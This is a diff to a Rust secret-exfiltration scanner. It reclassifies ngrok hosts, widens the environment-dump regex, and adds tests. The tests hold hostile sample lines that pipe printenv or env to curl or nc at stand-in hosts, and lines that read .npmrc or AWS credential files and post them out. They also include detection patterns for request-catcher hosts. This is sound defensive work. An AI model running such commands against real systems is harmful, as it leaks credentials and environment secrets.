@@ -13,13 +13,13 @@ use crate::{FileCtx, FileKind, Finding, Group, Lang, Severity};
 // The patterns spell their dots as `[.]` and break up their own keywords, so this file does not
 // match the rules it holds when the repo scans itself.
 
-/// Chat services bots post to by design: a webhook or a bot URL is MEDIUM unless more shows it
-/// carries secrets.
+/// Hosts that bots and dev servers use by design (chat webhooks, bot URLs, ngrok tunnels): a mention
+/// is MEDIUM unless a send is near and the file also reads secrets.
 fn chat_hosts() -> &'static Regex {
     static CELL: OnceLock<Regex> = OnceLock::new();
     cached(
         &CELL,
-        r"(?i)\bdiscord(?:app)?[.]com/api/webhooks/|\bapi[.]telegram[.]org/bot",
+        r"(?i)\bdiscord(?:app)?[.]com/api/webhooks/|\bapi[.]telegram[.]org/bot|\bngrok(?:-free)?[.](?:io|app)\b",
     )
 }
 
@@ -28,7 +28,7 @@ fn catcher_hosts() -> &'static Regex {
     static CELL: OnceLock<Regex> = OnceLock::new();
     cached(
         &CELL,
-        r"(?i)\bwebhook[.]site\b|\btransfer[.]sh\b|\bngrok(?:-free)?[.](?:io|app)\b|[.]oast[.](?:fun|me|pro|site)\b|\binteract[.]sh\b|\bpipedream[.]net\b",
+        r"(?i)\bwebhook[.]site\b|\btransfer[.]sh\b|[.]oast[.](?:fun|me|pro|site)\b|\binteract[.]sh\b|\bpipedream[.]net\b",
     )
 }
 
@@ -40,11 +40,14 @@ fn credential_paths() -> &'static Regex {
     )
 }
 
+/// A copy of the whole environment: a JSON dump, a spread, `Object.assign({}, ...)`, the entries
+/// or keys, Python's `dict(os.environ)` or `.copy()`, and `printenv` or `env` piped to a sender or
+/// substituted into its arguments. One variable (`process.env.HOME`, `printenv HOME`) is not.
 fn env_dumps() -> &'static Regex {
     static CELL: OnceLock<Regex> = OnceLock::new();
     cached(
         &CELL,
-        r"JSON[.]stringify\(\s*process[.]env|dict\(os[.]environ\)",
+        r"JSON[.]stringify\(\s*process[.]env|\{\s*[.][.][.]\s*process[.]env|Object[.]assign\(\s*\{\s*\}\s*,\s*process[.]env\s*\)|Object[.](?:entries|keys|values)\(\s*process[.]env\s*\)|dict\(os[.]environ\)|os[.]environ[.](?:copy|items|keys|values)\(\s*\)|(?:^|[\s;&(`])(?:printenv|env)\s*\|(?:[^\n|]*\|)*\s*(?:curl|wget|nc|ncat)\b|\b(?:curl|wget)\b[^\n]*(?:\$\(|`)\s*(?:printenv|env)\s*(?:\)|`)",
     )
 }
 
@@ -234,7 +237,9 @@ fn webhook(f: &FileCtx, text: &str, test: bool, out: &mut Vec<Finding>) {
     let catchers = hits_of(catcher_hosts(), text);
     // A chat URL is HIGH when it is sent to and the file also reads the environment or a token.
     let (chat, sent) = graded_hits(chat_hosts(), text, |at| send_near(text, at));
-    let reads_secrets = secret_reads().is_match(text) || credential_paths().is_match(text);
+    let reads_secrets = env_dumps().is_match(text)
+        || secret_reads().is_match(text)
+        || credential_paths().is_match(text);
     let high = catchers.first.is_some() || (sent && !test && reads_secrets);
     let first = match (catchers.first, chat.first) {
         (Some(a), Some(b)) => Some(a.min(b)),
@@ -448,15 +453,7 @@ mod tests {
 
     #[test]
     fn request_catcher_hosts_are_high_in_any_code() {
-        let all = [
-            WEBHOOK_SITE,
-            TRANSFER,
-            NGROK,
-            NGROK_FREE,
-            OAST,
-            INTERACT,
-            PIPEDREAM,
-        ];
+        let all = [WEBHOOK_SITE, TRANSFER, OAST, INTERACT, PIPEDREAM];
         for host in all {
             let t = format!("x = 1\nfetch(\"{host}\", {{ method: 'POST' }})\n");
             for lang in [Lang::Js, Lang::Rs, Lang::Go] {
@@ -659,6 +656,101 @@ mod tests {
     }
 
     #[test]
+    fn a_comment_marker_in_a_string_or_a_regex_does_not_hide_a_theft() {
+        // N4: an attacker puts a `//` or a `#` earlier on the line, inside a literal.
+        for line in [
+            format!("const a = \"//\"; const k = fs.readFileSync('{NPMRC}');"),
+            format!("const re = /\\/\\//; const k = fs.readFileSync('{NPMRC}');"),
+            format!("const u = 'http://x'; const k = fs.readFileSync('{NPMRC}');"),
+        ] {
+            let t = format!("{line}\nfetch(u, {{ body: k }});\n");
+            let v = code(Lang::Js, &t);
+            assert_eq!(
+                one(&v, "exfil.cred-path").severity,
+                Severity::High,
+                "{line}"
+            );
+        }
+        let py = format!("s = '#'; k = open('{AWS_CREDS}').read()\nrequests.post(u, data=k)\n");
+        assert_eq!(
+            one(&code(Lang::Py, &py), "exfil.cred-path").severity,
+            Severity::High
+        );
+        let dump = "const a = \"//\"; fetch(u, { body: JSON.stringify(process.env) });\n";
+        assert_eq!(
+            one(&code(Lang::Js, dump), "exfil.env-dump").severity,
+            Severity::High
+        );
+        // A real comment still caps the finding.
+        let real = format!("const k = 1; // fs.readFileSync('{NPMRC}')\nfetch(u);\n");
+        assert_eq!(
+            one(&code(Lang::Js, &real), "exfil.cred-path").severity,
+            Severity::Medium
+        );
+    }
+
+    #[test]
+    fn the_wider_environment_dumps_that_reach_a_send_are_high() {
+        let js = [
+            "const body = JSON.stringify({ ...process.env });",
+            "const body = { ...process.env };",
+            "const body = Object.assign({}, process.env);",
+            "const body = Object.entries(process.env);",
+            "const body = Object.keys( process.env );",
+        ];
+        for dump in js {
+            let t = format!("{dump}\nfetch('https://example.invalid/', {{ body }});\n");
+            let v = code(Lang::Js, &t);
+            assert_eq!(one(&v, "exfil.env-dump").severity, Severity::High, "{dump}");
+        }
+        for dump in [
+            "body = os.environ.copy()",
+            "body = dict(os.environ)",
+            "body = os.environ.items()",
+        ] {
+            let t = format!("{dump}\nrequests.post(u, json=body)\n");
+            let v = code(Lang::Py, &t);
+            assert_eq!(one(&v, "exfil.env-dump").severity, Severity::High, "{dump}");
+        }
+        for sh in [
+            "printenv | curl -d @- https://example.invalid/",
+            "env | curl -d @- https://example.invalid/",
+            "env | base64 | curl -d @- https://example.invalid/",
+            "curl -d \"$(printenv)\" https://example.invalid/",
+            "curl --data \"$(env)\" https://example.invalid/",
+            "wget --post-data=\"`printenv`\" https://example.invalid/",
+            "cd x; printenv | nc 203.0.113.9 80",
+        ] {
+            let v = code(Lang::Sh, &format!("{sh}\n"));
+            assert_eq!(one(&v, "exfil.env-dump").severity, Severity::High, "{sh}");
+        }
+    }
+
+    #[test]
+    fn reading_a_variable_or_piping_a_command_that_is_not_a_dump_is_clean() {
+        for js in [
+            "fetch(u, { body: process.env.HOME });",
+            "const { PATH } = process.env; fetch(u, { body: PATH });",
+            "const o = { ...options }; fetch(u, o);",
+        ] {
+            assert!(code(Lang::Js, &format!("{js}\n")).is_empty(), "{js}");
+        }
+        for sh in [
+            "printenv HOME | curl -d @- https://example.invalid/",
+            "env FOO=1 node a.js | tee log",
+            "cat env.txt | curl -d @- https://example.invalid/",
+            "curl -d \"$(hostname)\" https://example.invalid/",
+        ] {
+            let v = code(Lang::Sh, &format!("{sh}\n"));
+            assert!(
+                v.iter().all(|f| f.rule != "exfil.env-dump"),
+                "{sh}: {:?}",
+                rules(&v)
+            );
+        }
+    }
+
+    #[test]
     fn a_miner_marker_is_high_in_any_code() {
         for marker in [STRATUM, MINER_BIN, DONATE] {
             for lang in [Lang::Sh, Lang::Go, Lang::Js] {
@@ -750,8 +842,8 @@ mod tests {
 
     #[test]
     fn a_chat_webhook_alone_is_medium() {
-        // Bot repos post to Discord and Telegram by design.
-        for host in [DISCORD, DISCORDAPP, TELEGRAM] {
+        // Bot repos post to Discord and Telegram by design; dev servers sit behind ngrok.
+        for host in [DISCORD, DISCORDAPP, TELEGRAM, NGROK, NGROK_FREE] {
             let t = format!("x = 1\nfetch(\"{host}\", {{ method: 'POST' }})\n");
             for lang in [Lang::Js, Lang::Rs, Lang::Py] {
                 let v = code(lang, &t);
